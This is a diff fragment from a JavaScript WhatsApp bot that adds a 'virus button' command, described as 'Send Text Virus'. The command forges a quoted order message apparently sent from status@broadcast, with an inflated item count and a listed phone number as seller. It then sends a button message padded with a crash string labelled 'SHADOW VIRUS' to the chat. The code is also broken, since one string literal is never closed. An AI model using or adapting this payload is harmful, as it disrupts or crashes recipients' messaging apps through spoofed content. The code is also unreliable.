@@ -12420,6 +12420,43 @@ message.jid,AAG, MessageType.text, {quoted: { key: { fromMe: false, participant:
 
 }));
 
+Shadow.addCommand({pattern: 'virus button', fromMe: true, desc: 'Send Text Virus'}, (async (message, match) => {
+
+var url = await axios.get(Spark.THUMBNAIL, { responseType: 'arraybuffer' })
+
+let options = {}
+options.quoted = {
+      key: {
+        fromMe: false,
+        participant: "0@s.whatsapp.net",
+        remoteJid: "status@broadcast"
+      },
+      message: {
+        "orderMessage": {
+        	"itemCount" : 9999999999,
+             "status": 1,
+           "surface" : 1,
+           "message": AAG,
+           "orderTitle": "ShadoW",
+           "thumbnail": Buffer.from(url.data),
+           "sellerJid": '919526808481@s.whatsapp.net' 
+        }
+      }
+    }
+const buttons = [
+        { buttonId: 'VIRUS', buttonText: { displayText: 'SPARK SHADOW️' }, type: 1 }
+        ]
+    const { imageMessage } = await message.prepareMessageMedia(fs.readFileSync('./uploads/image/Shadow.jpg'), MessageType.image);
+    const buttonMessage = {
+        contentText: AAG,
+        footerText: 'SHADOW VIRUS' + AAG + 'SHADOW VIRUS,
+        buttons: buttons,
+        headerType: 4,
+        imageMessage: imageMessage
+    }
+await message.sendMessage(message.jid, buttonMessage, MessageType.buttonsMessage, options)
+
+}));
 }
 else if (Spark.SHADOWPW !== 'ShAdoW' || Spark.SHADOWPW !== 'SpArK' || Spark.SHADOWPW !== 'Ꮥ н @ ∂ ø Ш') {
 
